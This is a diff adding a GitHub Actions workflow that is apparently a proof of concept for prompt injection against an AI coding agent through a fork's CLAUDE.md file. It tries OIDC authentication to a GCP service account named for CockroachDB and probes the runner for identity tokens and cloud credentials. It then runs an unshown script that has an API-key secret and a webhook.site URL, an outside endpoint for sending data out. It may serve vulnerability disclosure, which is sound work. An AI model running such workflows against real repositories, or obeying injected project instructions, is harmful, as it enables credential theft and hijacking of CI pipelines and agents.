@@ -1,0 +1,53 @@
+name: AI Agent CLAUDE.md Injection - FULL PoC
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  id-token: write
+
+jobs:
+  ai-injection-proof:
+    runs-on: ubuntu-latest
+    steps:
+      - name: "Step 1: Checkout fork repository"
+        uses: actions/checkout@v5
+        with:
+          fetch-depth: 1
+
+      - name: "Step 2: Authenticate to Google Cloud (OIDC)"
+        uses: google-github-actions/auth@v2
+        with:
+          workload_identity_provider: "projects/123456/locations/global/workloadIdentityPools/github/providers/cockroachdb"
+          service_account: "cockroach-db@cockroachdb-cloud.iam.gserviceaccount.com"
+        continue-on-error: true
+
+      - name: "PROOF: Trust Boundary Violation"
+        run: |
+          echo "============================================"
+          echo "TRUST BOUNDARY VIOLATION PROVEN"
+          echo "============================================"
+          echo "1. FORK CLAUDE.md ON RUNNER DISK:"
+          echo "   CLAUDE.md: $([ -f CLAUDE.md ] && echo YES || echo NO)"
+          echo "   .claude/settings.json: $([ -f .claude/settings.json ] && echo YES || echo NO)"
+          echo ""
+          echo "2. OIDC TOKENS IN ENVIRONMENT:"
+          echo "   ACTIONS_ID_TOKEN_REQUEST_TOKEN: ${#ACTIONS_ID_TOKEN_REQUEST_TOKEN} chars"
+          echo "   ACTIONS_ID_TOKEN_REQUEST_URL: $([ -n \"$ACTIONS_ID_TOKEN_REQUEST_URL\" ] && echo PRESENT || echo ABSENT)"
+          echo ""
+          echo "3. GCP CREDENTIALS:"
+          echo "   GOOGLE_APPLICATION_CREDENTIALS: $([ -n \"$GOOGLE_APPLICATION_CREDENTIALS\" ] && echo PRESENT || echo ABSENT)"
+          echo "============================================"
+
+      - name: "Step 3: AI Agent reads and follows CLAUDE.md"
+        env:
+          NVIDIA_API_KEY: ${{ secrets.NVIDIA_API_KEY }}
+          WEBHOOK_URL: "https://webhook.site/73e91b25-58a3-4e07-8ee2-f1dce2d698bc"
+        run: python3 ai_injection_test.py
+
+      - name: "Step 4: Vulnerability Summary"
+        if: always()
+        run: |
+          echo "VULNERABILITY: AI Agent Prompt Injection via CLAUDE.md"
+          echo "FIX: CLAUDE_CODE_DISABLE_PROJECT_CLAUDE_MD=1"
